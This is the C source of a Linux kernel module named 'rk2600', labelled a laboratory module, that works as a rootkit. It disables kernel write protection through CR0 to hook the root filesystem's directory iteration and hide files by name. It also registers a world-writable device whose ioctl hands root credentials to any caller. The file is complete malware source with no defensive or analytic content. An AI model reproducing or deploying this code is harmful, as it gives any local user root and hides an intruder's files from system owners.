#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <asm/processor-flags.h>

#include "rk2600_protocol.h"

/* ----------------------------------------------------------------- hidden list */

struct hidden_entry {
	struct list_head list;
	char name[RK2600_NAME_MAX + 1];
};

static LIST_HEAD(hidden_list);
static DEFINE_SPINLOCK(hidden_lock);

static bool is_hidden(const char *name, int namlen)
{
	struct hidden_entry *entry;
	bool found = false;

	spin_lock(&hidden_lock);
	list_for_each_entry(entry, &hidden_list, list) {
		if ((int)strlen(entry->name) == namlen &&
		    memcmp(entry->name, name, namlen) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_lock);
	return found;
}

static int add_hidden(const char *name)
{
	struct hidden_entry *entry;

	spin_lock(&hidden_lock);
	list_for_each_entry(entry, &hidden_list, list) {
		if (strcmp(entry->name, name) == 0) {
			spin_unlock(&hidden_lock);
			return 0;
		}
	}
	spin_unlock(&hidden_lock);

	entry = kmalloc(sizeof(*entry), GFP_KERNEL);
	if (!entry)
		return -ENOMEM;

	strscpy(entry->name, name, sizeof(entry->name));

	spin_lock(&hidden_lock);
	list_add_tail(&entry->list, &hidden_list);
	spin_unlock(&hidden_lock);
	return 0;
}

static int remove_hidden(const char *name)
{
	struct hidden_entry *entry, *tmp;

	spin_lock(&hidden_lock);
	list_for_each_entry_safe(entry, tmp, &hidden_list, list) {
		if (strcmp(entry->name, name) == 0) {
			list_del(&entry->list);
			spin_unlock(&hidden_lock);
			kfree(entry);
			return 0;
		}
	}
	spin_unlock(&hidden_lock);
	return -ENOENT;
}

static void free_hidden_list(void)
{
	struct hidden_entry *entry, *tmp;

	spin_lock(&hidden_lock);
	list_for_each_entry_safe(entry, tmp, &hidden_list, list) {
		list_del(&entry->list);
		kfree(entry);
	}
	spin_unlock(&hidden_lock);
}

/* --------------------------------------------------------- write-protect bypass */

static inline unsigned long wp_disable(void)
{
	unsigned long cr0;

	preempt_disable();
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	asm volatile("mov %0, %%cr0" : : "r"(cr0 & ~X86_CR0_WP) : "memory");
	return cr0;
}

static inline void wp_restore(unsigned long cr0)
{
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	preempt_enable();
}

/* --------------------------------------------------------------- VFS hooking */

static int (*orig_iterate_shared)(struct file *, struct dir_context *);
static struct file_operations *hooked_fops;

struct rk_dir_context {
	struct dir_context ctx;
	struct dir_context *orig_ctx;
};

static bool rk_filldir(struct dir_context *ctx, const char *name, int namlen,
		       loff_t offset, u64 ino, unsigned d_type)
{
	struct rk_dir_context *rk =
		container_of(ctx, struct rk_dir_context, ctx);

	if (is_hidden(name, namlen))
		return true;

	return rk->orig_ctx->actor(rk->orig_ctx, name, namlen,
				   offset, ino, d_type);
}

static int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
	struct rk_dir_context rk_ctx = {
		.ctx.actor = rk_filldir,
		.ctx.pos   = ctx->pos,
		.orig_ctx  = ctx,
	};
	int ret;

	ret = orig_iterate_shared(file, &rk_ctx.ctx);
	ctx->pos = rk_ctx.ctx.pos;
	return ret;
}

static int install_hook(void)
{
	struct file *root;
	unsigned long cr0;

	root = filp_open("/", O_RDONLY | O_DIRECTORY, 0);
	if (IS_ERR(root))
		return PTR_ERR(root);

	hooked_fops = (struct file_operations *)root->f_op;
	orig_iterate_shared = hooked_fops->iterate_shared;

	cr0 = wp_disable();
	hooked_fops->iterate_shared = rk_iterate_shared;
	wp_restore(cr0);

	filp_close(root, NULL);
	pr_info("rk2600: hook installed\n");
	return 0;
}

static void remove_hook(void)
{
	unsigned long cr0;

	if (!hooked_fops || !orig_iterate_shared)
		return;

	cr0 = wp_disable();
	hooked_fops->iterate_shared = orig_iterate_shared;
	wp_restore(cr0);

	pr_info("rk2600: hook removed\n");
}

/* ---------------------------------------------------------- ioctl handlers */

static int handle_elevate(void)
{
	struct cred *creds;

	creds = prepare_kernel_cred(NULL);
	if (!creds)
		return -ENOMEM;

	return commit_creds(creds);
}

static int handle_status(unsigned long arg)
{
	struct rk2600_status st = {
		.api_version = RK2600_API_VERSION,
	};

	if (copy_to_user((void __user *)arg, &st, sizeof(st)))
		return -EFAULT;
	return 0;
}

static int handle_hide(unsigned long arg)
{
	struct rk2600_name_request req;

	if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
		return -EFAULT;

	req.name[RK2600_NAME_MAX] = '\0';
	if (req.name[0] == '\0')
		return -EINVAL;

	return add_hidden(req.name);
}

static int handle_unhide(unsigned long arg)
{
	struct rk2600_name_request req;

	if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
		return -EFAULT;

	req.name[RK2600_NAME_MAX] = '\0';
	if (req.name[0] == '\0')
		return -EINVAL;

	return remove_hidden(req.name);
}

static long rk2600_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	switch (cmd) {
	case RK2600_IOC_ELEVATE:
		return handle_elevate();
	case RK2600_IOC_STATUS:
		return handle_status(arg);
	case RK2600_IOC_HIDE:
		return handle_hide(arg);
	case RK2600_IOC_UNHIDE:
		return handle_unhide(arg);
	default:
		return -ENOTTY;
	}
}

/* --------------------------------------------------------------- misc device */

static const struct file_operations rk2600_fops = {
	.owner          = THIS_MODULE,
	.unlocked_ioctl = rk2600_ioctl,
};

static struct miscdevice rk2600_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = RK2600_DEVICE_NAME,
	.fops  = &rk2600_fops,
	.mode  = 0666,
};

/* -------------------------------------------------------- module init/exit */

static int __init rk2600_init(void)
{
	int ret;

	ret = misc_register(&rk2600_dev);
	if (ret) {
		pr_err("rk2600: misc_register failed (%d)\n", ret);
		return ret;
	}

	ret = install_hook();
	if (ret) {
		pr_err("rk2600: hook install failed (%d)\n", ret);
		misc_deregister(&rk2600_dev);
		return ret;
	}

	pr_info("rk2600: loaded (API v%u)\n", RK2600_API_VERSION);
	return 0;
}

static void __exit rk2600_exit(void)
{
	remove_hook();
	free_hidden_list();
	misc_deregister(&rk2600_dev);
	pr_info("rk2600: unloaded\n");
}

module_init(rk2600_init);
module_exit(rk2600_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rk2600 laboratory module");
